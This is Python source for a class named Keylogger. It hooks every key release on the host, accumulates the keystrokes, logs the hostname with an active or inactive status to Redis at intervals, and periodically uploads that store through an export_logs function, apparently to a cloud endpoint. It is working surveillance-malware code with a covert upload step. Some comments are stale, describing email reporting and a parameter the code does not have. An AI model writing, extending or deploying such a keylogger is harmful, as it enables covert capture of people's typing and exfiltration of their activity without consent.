import redis
import socket
import keyboard
from threading import Timer
from datetime import datetime
from rejson import Client, Path
from request_service import export_logs

SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on

redis = Client(host="localhost", port=6379, decode_responses=True)
hostname = socket.gethostname()
data = {
    'hostname': hostname,
    'logs': []
}


class Keylogger:
    def __init__(self, interval, sync_to_cloud):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.sync_to_cloud = sync_to_cloud
        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name

    def send_to_redis(self):
        if (self.log != ''):
            obj = {
                "dateTime": datetime.now().strftime("%Y-%m-%d %H:%M:%S").__str__(),
                'activity': "ACTIVE",
            }
            redis.jsonarrappend('log', Path('.logs'), obj)
        else:
            obj = {
                "dateTime": datetime.now().strftime("%Y-%m-%d %H:%M:%S").__str__(),
                'activity': "INACTIVE",
            }
            redis.jsonarrappend('log', Path('.logs'), obj)

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        # if there is something in log, report it
        self.end_dt = datetime.now()
        # update `self.filename`
        # self.update_filename()
        self.send_to_redis()
        # if you don't want to print in the console, comment below line
        self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def send_to_cloud(self):
        data = redis.jsonget('log', Path.rootPath())
        export_logs(data)
        sync_timer = Timer(interval=self.sync_to_cloud, function=self.send_to_cloud)
        # set the thread as daemon (dies when main thread die)
        sync_timer.daemon = True
        # start the timer
        sync_timer.start()


    def start(self):
        # record the start datetime
        redis.jsonset('log', Path.rootPath(), data)
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        self.send_to_cloud()
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()


if __name__ == "__main__":
    # if you want a keylogger to send to your email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want a keylogger to record keylogs to a local file
    # (and then send it using your favorite method)
    keylogger = Keylogger(interval=10, sync_to_cloud=30)
    keylogger.start()
